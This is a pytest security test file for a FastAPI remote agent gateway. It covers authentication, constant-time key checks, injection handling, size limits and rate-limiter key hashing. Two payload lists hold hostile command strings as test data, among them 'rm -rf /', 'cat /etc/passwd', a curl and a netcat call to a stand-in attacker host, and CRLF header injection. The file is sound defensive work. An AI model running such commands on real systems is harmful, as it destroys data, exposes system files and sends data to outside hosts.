"""Security tests for the remote agent execution API (t_c6e8d39f).

Task: [TEST] Security Tests
File: tests/test_security.py

These tests target the security surface of ``gateway.remote_agent_api``:

  1. test_unauthorized_access           — request with no X-Hermes-Key header
  2. test_invalid_auth_key              — request with a wrong X-Hermes-Key
  3. test_timing_attack_resistance      — ``verify_api_key`` uses
                                          ``hmac.compare_digest``
  4. test_injection_attack_prompt       — SQL/command injection payloads in
                                          ``prompt`` are not honoured or
                                          reflected in a way that would
                                          escape the transport
  5. test_injection_attack_user_id      — format-bypass attempts in
                                          ``session_id`` are rejected by
                                          ``validate_chat_id``
  6. test_dos_prevention_large_prompt   — prompt over the 100 KB limit is
                                          rejected before hitting the agent
  7. test_dos_prevention_large_session_id
                                        — session_id over the 256 char limit
                                          is rejected
  8. test_dos_prevention_unbounded_dict — ``_rate_limit_key`` hashes the API
                                          key so a caller cannot inflate the
                                          rate-limiter dict with attacker-
                                          chosen bucket names

Boots a real FastAPI app via ``create_remote_api_blueprint`` (same wiring the
production gateway uses) and drives it with ``fastapi.testclient.TestClient``.
The auth key is injected into the process env BEFORE the blueprint is
registered so ``verify_api_key`` reads it via the LRU-cached
``get_expected_key``.
"""

from __future__ import annotations

import asyncio
import hashlib
import hmac
import os
import re
import statistics
import sys
import time
from pathlib import Path
from typing import Any, Dict, Optional
from unittest.mock import AsyncMock, MagicMock

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

# Ensure the repo root is importable when pytest is run from anywhere.
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from gateway import remote_agent_api  # noqa: E402
from gateway.remote_agent_api import (  # noqa: E402
    CHAT_ID_MAX_LENGTH,
    _rate_limit_key,
    create_remote_api_blueprint,
    get_expected_key,
    get_rate_limiter,
    validate_chat_id,
    verify_api_key,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

_TEST_API_KEY = "test-api-key-security-t_c6e8d39f"


@pytest.fixture(autouse=True)
def _reset_module_state(monkeypatch):
    """Each test starts with a clean env, cleared LRU cache, and a fresh
    rate-limiter singleton.

    ``get_expected_key`` is ``@lru_cache(maxsize=1)``-decorated: once it
    reads ``HERMES_REMOTE_API_KEY`` it never re-reads. Tests that mutate the
    env (e.g. to simulate a missing key) must invalidate that cache before
    calling into the module.
    """
    monkeypatch.setenv("HERMES_REMOTE_API_KEY", _TEST_API_KEY)
    get_expected_key.cache_clear()

    previous_limiter = remote_agent_api._rate_limiter
    remote_agent_api._rate_limiter = None
    try:
        yield
    finally:
        current = remote_agent_api._rate_limiter
        if current is not None and current is not previous_limiter:
            try:
                current.shutdown()
            except Exception:
                pass
        remote_agent_api._rate_limiter = previous_limiter
        get_expected_key.cache_clear()


def _build_gateway_runner(chat_return: str = "hello from local agent") -> MagicMock:
    """Return a MagicMock GatewayRunner exposing the minimal surface the
    remote-api blueprint calls: ``instance_orchestrator.execute_on_instance``
    and ``agent.chat``.
    """
    orchestrator = MagicMock()
    # Default: orchestrator returns None => remote_api falls through to the
    # local agent path.
    orchestrator.execute_on_instance = AsyncMock(return_value=None)

    gateway = MagicMock()
    gateway.instance_orchestrator = orchestrator
    gateway.agent = MagicMock()
    gateway.agent.chat = MagicMock(return_value=chat_return)
    return gateway


def _build_app(gateway_runner: MagicMock) -> FastAPI:
    """Register the remote-agent blueprint on a fresh FastAPI app."""
    app = FastAPI()
    asyncio.run(create_remote_api_blueprint(app, gateway_runner))
    return app


@pytest.fixture
def gateway_runner() -> MagicMock:
    return _build_gateway_runner()


@pytest.fixture
def client(gateway_runner) -> TestClient:
    return TestClient(_build_app(gateway_runner))


def _auth_headers(
    key: Optional[str] = _TEST_API_KEY,
    user: str = "security-tester",
) -> Dict[str, str]:
    headers: Dict[str, str] = {"X-Hermes-User": user}
    if key is not None:
        headers["X-Hermes-Key"] = key
    return headers


def _valid_body(**overrides: Any) -> Dict[str, Any]:
    body = {
        "agent_id": "default",
        "prompt": "hello",
        "session_id": "user_abc.123",
    }
    body.update(overrides)
    return body


# ---------------------------------------------------------------------------
# 1. Unauthorized access — no X-Hermes-Key header
# ---------------------------------------------------------------------------


def test_unauthorized_access(client, gateway_runner):
    """A request without X-Hermes-Key must be rejected with 401 and MUST
    NOT reach the agent."""
    resp = client.post(
        "/api/agent/execute",
        json=_valid_body(),
        headers={"X-Hermes-User": "no-key-user"},  # deliberately no key
    )
    assert resp.status_code == 401, resp.text

    # Also cover /health and /api/agent/status: both are auth-gated
    # (AUTH-GATE-ZERO). Neither should leak deployment fingerprint.
    assert client.get("/health").status_code == 401
    assert client.get("/api/agent/status").status_code == 401

    # The blueprint short-circuits at the auth check — the orchestrator and
    # the local agent must not have been invoked.
    gateway_runner.instance_orchestrator.execute_on_instance.assert_not_awaited()
    gateway_runner.agent.chat.assert_not_called()


# ---------------------------------------------------------------------------
# 2. Invalid auth key — wrong key value
# ---------------------------------------------------------------------------


def test_invalid_auth_key(client, gateway_runner):
    """A request carrying a wrong X-Hermes-Key must be rejected with 401."""
    resp = client.post(
        "/api/agent/execute",
        json=_valid_body(),
        headers=_auth_headers(key="wrong-key-value"),
    )
    assert resp.status_code == 401, resp.text

    # An empty-string key is also invalid (not merely "missing").
    resp = client.post(
        "/api/agent/execute",
        json=_valid_body(),
        headers=_auth_headers(key=""),
    )
    assert resp.status_code == 401, resp.text

    # A key that is a *prefix* of the real key must also be rejected — no
    # substring-matching or length-only comparisons.
    resp = client.post(
        "/api/agent/execute",
        json=_valid_body(),
        headers=_auth_headers(key=_TEST_API_KEY[:10]),
    )
    assert resp.status_code == 401, resp.text

    gateway_runner.instance_orchestrator.execute_on_instance.assert_not_awaited()
    gateway_runner.agent.chat.assert_not_called()


# ---------------------------------------------------------------------------
# 3. Timing-attack resistance — hmac.compare_digest protection
# ---------------------------------------------------------------------------


def test_timing_attack_resistance(monkeypatch):
    """``verify_api_key`` must use ``hmac.compare_digest``.

    We assert this two ways:

    A. Structural: monkeypatch ``hmac.compare_digest`` and confirm
       ``verify_api_key`` routes through it — this catches any future
       accidental drift back to ``==``.
    B. Statistical (soft): with a fixed 64-char expected key, comparing
       against inputs that differ in the first byte vs the last byte should
       take indistinguishable time on average. This is inherently noisy on
       CI; we assert a generous bound rather than a strict one.
    """
    # --- A. Structural check --------------------------------------------------
    monkeypatch.setenv("HERMES_REMOTE_API_KEY", "correct-key-value")
    get_expected_key.cache_clear()

    call_count = {"n": 0}
    real_compare = hmac.compare_digest

    def counting_compare(a, b):
        call_count["n"] += 1
        return real_compare(a, b)

    monkeypatch.setattr(remote_agent_api.hmac, "compare_digest", counting_compare)

    assert verify_api_key("correct-key-value") is True
    assert verify_api_key("wrong-key-value_") is False
    assert call_count["n"] == 2, (
        "verify_api_key must route both comparisons through hmac.compare_digest"
    )

    # --- B. Statistical check -------------------------------------------------
    monkeypatch.setattr(remote_agent_api.hmac, "compare_digest", real_compare)
    monkeypatch.setenv("HERMES_REMOTE_API_KEY", "a" * 64)
    get_expected_key.cache_clear()

    # Prime the CPU (JIT/cache warmup) so the first sample isn't an outlier.
    for _ in range(200):
        verify_api_key("b" + "a" * 63)
        verify_api_key("a" * 63 + "b")

    ITERS = 2000

    def _median_ns(candidate: str) -> float:
        samples = []
        for _ in range(ITERS):
            t0 = time.perf_counter_ns()
            verify_api_key(candidate)
            samples.append(time.perf_counter_ns() - t0)
        return statistics.median(samples)

    diff_at_start = _median_ns("b" + "a" * 63)
    diff_at_end = _median_ns("a" * 63 + "b")

    # With ``hmac.compare_digest`` the two medians should be within a factor
    # of ~2 even on noisy CI runners. A naïve ``==`` short-circuits on the
    # first mismatching byte, so ``diff_at_start`` would be far smaller than
    # ``diff_at_end``. We assert the *ratio* stays bounded.
    ratio = max(diff_at_start, diff_at_end) / max(1.0, min(diff_at_start, diff_at_end))
    assert ratio < 5.0, (
        "verify_api_key appears to short-circuit on first mismatch "
        f"(ratio={ratio:.2f}, start={diff_at_start:.0f}ns, end={diff_at_end:.0f}ns). "
        "hmac.compare_digest must be used for constant-time comparison."
    )


# ---------------------------------------------------------------------------
# 4. Injection attack — SQL / command injection in prompt
# ---------------------------------------------------------------------------


def test_injection_attack_prompt(client, gateway_runner):
    """Injection payloads in ``prompt`` must be passed through as opaque
    strings — they must NOT be interpolated, executed, or reflected in a
    way that escapes the transport.

    We do NOT require the API to *reject* injection strings (a prompt is by
    definition free-form text). We DO require:
      1. The server returns a normal JSON response, not a 5xx.
      2. The payload is delivered to the agent verbatim (the agent gets to
         decide what to do with it — the API layer must not mangle it).
      3. No SQL/shell metacharacter is stripped or transformed by the API.
    """
    payloads = [
        "'; DROP TABLE users; --",
        "1 OR 1=1",
        "$(rm -rf /)",
        "`whoami`",
        "&& cat /etc/passwd",
        "|| curl attacker.example.com/x",
        "; shutdown -h now",
        "<script>alert(1)</script>",
        "\x00\x01\x02NUL-bytes-are-fine-in-a-prompt",
    ]

    for payload in payloads:
        gateway_runner.agent.chat.reset_mock()
        gateway_runner.instance_orchestrator.execute_on_instance.reset_mock()

        resp = client.post(
            "/api/agent/execute",
            json=_valid_body(prompt=payload),
            headers=_auth_headers(),
        )
        # Server processed it (200), didn't crash (5xx), and didn't reject
        # it as malformed (400/422). Content is agent's problem, not API's.
        assert resp.status_code == 200, (
            f"payload {payload!r} produced HTTP {resp.status_code}: {resp.text}"
        )

        # The prompt reached the agent verbatim — no sanitizing at the API
        # layer that would give the caller a false sense of safety.
        gateway_runner.agent.chat.assert_called_once()
        (delivered_prompt,), _kwargs = gateway_runner.agent.chat.call_args
        # ``ExecuteRequest.validate_prompt`` strips outer whitespace, so we
        # compare against the stripped form.
        assert delivered_prompt == payload.strip(), (
            f"prompt was mutated by the API layer: sent={payload!r}, "
            f"delivered={delivered_prompt!r}"
        )


# ---------------------------------------------------------------------------
# 5. Injection attack — format bypass in session_id / chat_id
# ---------------------------------------------------------------------------


def test_injection_attack_user_id(client):
    """``session_id`` carries the chat_id and MUST enforce the INPUT-
    INVARIANT-01 charset. Any format-bypass attempt must be rejected at the
    API layer with 4xx — never a 5xx, never a 2xx.
    """
    injection_attempts = [
        "user\nlog-forge",                    # newline (log forging)
        "user\r\nSet-Cookie: evil=1",         # CRLF header injection
        "user\x00null-byte",                  # null byte
        "user\x1bansi-escape",                # control char
        "user'; DROP TABLE sessions;--",      # SQL meta
        "user`whoami`",                       # shell backticks
        "user$(rm -rf /)",                    # command substitution
        "user;shutdown -h now",               # command chain
        "user|nc attacker 4444",              # pipe / netcat
        "user with spaces",                   # spaces are outside charset
        "user<script>",                       # angle brackets
        "user\"quoted\"",                     # double quotes
        "user{brace}",                        # braces
        "../../../etc/passwd",                # path traversal chars (/ is
                                              # in charset but .. combined
                                              # with other patterns is still
                                              # a red flag — this specific
                                              # one is technically allowed
                                              # by the charset, so we drop
                                              # it below).
    ]
    # Path traversal via "/" is technically inside the allowed charset
    # (["a-zA-Z0-9_\-.:/@"]). The invariant is documented as opaque
    # platform routing, so we don't test-ban "../..". Keep it out of the
    # rejection list.
    injection_attempts = [p for p in injection_attempts if p != "../../../etc/passwd"]

    for payload in injection_attempts:
        resp = client.post(
            "/api/agent/execute",
            json=_valid_body(session_id=payload),
            headers=_auth_headers(),
        )
        assert 400 <= resp.status_code < 500, (
            f"session_id {payload!r} was accepted (HTTP {resp.status_code}) "
            f"— chat_id invariant not enforced. body={resp.text}"
        )

    # Direct check against ``validate_chat_id`` — the single source of truth
    # for the invariant.
    for payload in injection_attempts:
        with pytest.raises(ValueError):
            validate_chat_id(payload, field_name="session_id")

    # Sanity: a well-formed session_id still passes.
    ok = validate_chat_id("telegram:user:12345", field_name="session_id")
    assert ok == "telegram:user:12345"


# ---------------------------------------------------------------------------
# 6. DoS prevention — oversized prompt is rejected before hitting the agent
# ---------------------------------------------------------------------------


def test_dos_prevention_large_prompt(client, gateway_runner):
    """A prompt larger than 100 KB must be rejected with 4xx (Pydantic 422
    or FastAPI 400) and MUST NOT reach the agent."""
    # 100_001 bytes — just past the 100 000-byte cap.
    over_limit = "A" * 100_001

    resp = client.post(
        "/api/agent/execute",
        json=_valid_body(prompt=over_limit),
        headers=_auth_headers(),
    )
    assert 400 <= resp.status_code < 500, (
        f"oversized prompt was accepted (HTTP {resp.status_code}): {resp.text}"
    )

    # Way-over-limit: 10 MB. Same behaviour, no memory blow-up.
    huge = "B" * (10 * 1024 * 1024)
    resp = client.post(
        "/api/agent/execute",
        json=_valid_body(prompt=huge),
        headers=_auth_headers(),
    )
    assert 400 <= resp.status_code < 500

    # The agent must not have been called for any oversized submission.
    gateway_runner.agent.chat.assert_not_called()
    gateway_runner.instance_orchestrator.execute_on_instance.assert_not_awaited()

    # Boundary: exactly 100 000 bytes is the documented max — allowed.
    at_limit = "C" * 100_000
    resp = client.post(
        "/api/agent/execute",
        json=_valid_body(prompt=at_limit),
        headers=_auth_headers(),
    )
    assert resp.status_code == 200, resp.text


# ---------------------------------------------------------------------------
# 7. DoS prevention — oversized session_id is rejected
# ---------------------------------------------------------------------------


def test_dos_prevention_large_session_id(client, gateway_runner):
    """A session_id larger than CHAT_ID_MAX_LENGTH must be rejected with
    4xx and MUST NOT reach the agent."""
    over_limit = "a" * (CHAT_ID_MAX_LENGTH + 1)

    resp = client.post(
        "/api/agent/execute",
        json=_valid_body(session_id=over_limit),
        headers=_auth_headers(),
    )
    assert 400 <= resp.status_code < 500, (
        f"oversized session_id was accepted (HTTP {resp.status_code}): "
        f"{resp.text}"
    )

    # Direct check against ``validate_chat_id``.
    with pytest.raises(ValueError, match=r"maximum length"):
        validate_chat_id(over_limit, field_name="session_id")

    # 1 MB session_id: same rejection, no memory blow-up.
    huge = "b" * (1024 * 1024)
    resp = client.post(
        "/api/agent/execute",
        json=_valid_body(session_id=huge),
        headers=_auth_headers(),
    )
    assert 400 <= resp.status_code < 500

    gateway_runner.agent.chat.assert_not_called()

    # Boundary: exactly CHAT_ID_MAX_LENGTH is allowed (charset-constrained).
    at_limit = "c" * CHAT_ID_MAX_LENGTH
    assert validate_chat_id(at_limit, field_name="session_id") == at_limit


# ---------------------------------------------------------------------------
# 8. DoS prevention — unbounded dict via chat_id / rate-limit key hashing
# ---------------------------------------------------------------------------


def test_dos_prevention_unbounded_dict():
    """``_rate_limit_key`` must hash the API key so a caller cannot inflate
    the rate-limiter dict by supplying arbitrarily long or arbitrarily many
    unique keys.

    Concretely:
      - The returned bucket is at most a small constant length regardless
        of input size.
      - Two identical keys map to the same bucket (determinism).
      - Two different keys map to different buckets (collision-avoidance
        within the truncated 64-bit hash).
      - The X-Hermes-User path is not hashed (documented behaviour), so a
        very long user string maps to a very long bucket — but that is
        bounded upstream by Pydantic's ``max_length=255`` on session_id
        and by header-size limits on X-Hermes-User at the transport layer.
    """
    # 1) Long API keys collapse to a bounded bucket.
    long_key = "k" * 100_000
    bucket = _rate_limit_key(x_hermes_user=None, x_hermes_key=long_key)
    assert bucket.startswith("key:"), bucket
    # ``key:`` prefix (4) + 16 hex chars = 20 total.
    assert len(bucket) == len("key:") + 16, bucket
    # It must be the SHA-256 hex prefix — not a truncation of the raw key.
    expected_hash = hashlib.sha256(long_key.encode()).hexdigest()[:16]
    assert bucket == f"key:{expected_hash}"
    # And crucially: the raw key must not appear in the bucket.
    assert "k" * 100 not in bucket

    # 2) Same key → same bucket (determinism).
    assert _rate_limit_key(None, "abc") == _rate_limit_key(None, "abc")

    # 3) Different keys → different buckets (no accidental collapse).
    b1 = _rate_limit_key(None, "attacker-key-1")
    b2 = _rate_limit_key(None, "attacker-key-2")
    assert b1 != b2

    # 4) Feed 10_000 unique attacker-chosen keys through the limiter and
    #    confirm the dict does NOT grow with per-key raw storage — every
    #    bucket key is bounded to 20 chars.
    limiter = remote_agent_api.RateLimiter(max_requests=1_000_000, window_seconds=60)
    try:
        for i in range(10_000):
            attacker_key = f"attacker-injected-{'x' * 500}-{i}"
            bucket = _rate_limit_key(None, attacker_key)
            assert len(bucket) == len("key:") + 16
            limiter.is_allowed(bucket)
        # Every dict key is a bounded hash — no attacker-controlled raw
        # strings sitting in memory.
        for stored_key in limiter.request_history.keys():
            assert len(stored_key) == len("key:") + 16, (
                f"unbounded key in rate-limiter dict: {stored_key!r}"
            )
            assert re.fullmatch(r"key:[0-9a-f]{16}", stored_key), stored_key
    finally:
        limiter.shutdown()

    # 5) User path: X-Hermes-User is used verbatim (documented). Empty /
    #    whitespace-only user falls back to the key-hash path.
    assert _rate_limit_key("alice", None) == "user:alice"
    assert _rate_limit_key("   ", "abc").startswith("key:")
    assert _rate_limit_key(None, None) == "anonymous:"
